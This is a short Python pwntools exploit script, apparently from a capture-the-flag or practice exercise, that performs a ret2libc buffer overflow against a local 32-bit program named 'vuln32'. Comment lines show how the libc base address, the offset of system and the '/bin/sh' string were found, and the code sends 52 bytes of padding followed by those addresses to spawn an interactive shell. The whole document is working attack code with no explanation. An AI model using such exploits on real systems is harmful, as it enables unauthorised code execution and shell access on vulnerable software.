#ldd vuln32
#libc.so.6 => /lib32/libc.so.6 -> 0xf7ddb000
#readelf -s /lib32/libc.so.6|grep system  -> 0x3e9e0
#strings -a -t x /lib32/libc.so.6 |grep /bin/sh -> 0x17eaaa
  
from pwn import *
p=process('')
print(p.recv())

base_libc = 0xf7ddb000
padding = b'A'*52
system = p32(base_libc+0x3e9e0)
ret = p32(0x0)
binsh = p32(base_libc+0x17eaaa)

p.sendline(padding+system+ret+binsh)
print(p.clean())
p.interactive()
